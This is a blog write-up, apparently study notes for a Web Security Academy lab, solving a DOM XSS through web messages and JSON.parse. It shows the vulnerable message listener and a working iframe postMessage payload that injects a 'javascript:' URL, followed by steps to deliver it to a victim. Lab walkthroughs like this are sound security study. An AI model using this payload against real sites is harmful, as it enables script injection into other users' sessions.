---
layout: post
title:  "DOM XSS using web messages and JSON.parse"
date:   2024-11-19 10:20:54 +0530
categories: [BSCP, DOM Based]
---

## Objective 


## Solution 

Look into source of the page, we found the following javascript code 

```js
<script>
    window.addEventListener('message', function (e) {
        // Create an iframe and an ACMEplayer object to manage the iframe
        var iframe = document.createElement('iframe');
        var ACMEplayer = { element: iframe };
        var d;

        // Append the iframe to the document body
        document.body.appendChild(iframe);

        // Attempt to parse the incoming message data as JSON
        try {
            d = JSON.parse(e.data);
        } catch (e) {
            return; // Exit if parsing fails
        }

        // Handle different message types
        switch (d.type) {
            case "page-load":
                // Scroll the ACMEplayer iframe into view
                ACMEplayer.element.scrollIntoView();
                break;

            case "load-channel":
                // Set the iframe's source URL
                ACMEplayer.element.src = d.url;
                break;

            case "player-height-changed":
                // Adjust the iframe's width and height
                ACMEplayer.element.style.width = d.width + "px";
                ACMEplayer.element.style.height = d.height + "px";
                break;

            default:
                // Ignore unknown message types
                break;
        }
    }, false);
</script>
```

By the look of it, only `load-channel` type is interesting ones.. because we can set the key like `url` set the value to `javascript:print()` and since it will load inside an iframe and executes it 

Constructing all with the following payload,

```html
<iframe src=https://0aff003603b08889806fd08d009600db.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>
```

When the iframe loads, it sends a message with the type `load-channel` to the main page. The event listener parses this message and processes it in a `switch` statement.

For the `load-channel` case, the `url` property from the message is assigned to the `src` of the iframe (`ACMEplayer.element`). If this `url` contains a malicious JavaScript payload, it is executed. Since no origin check is performed and `targetOrigin` is unrestricted (`'*'`), the payload runs when the victim opens the page, triggering the `print()` function.

Now copy paste the payload into exploit server and then just view the exploit on whether the payload works and the payload works where the `print()` function is triggered

![]({{ site.baseurl }}/assets/images/dom/dom-2.png)

Just deliver the exploit to victim and that solves the lab 

![]({{ site.baseurl }}/assets/images/dom/dom-3.png)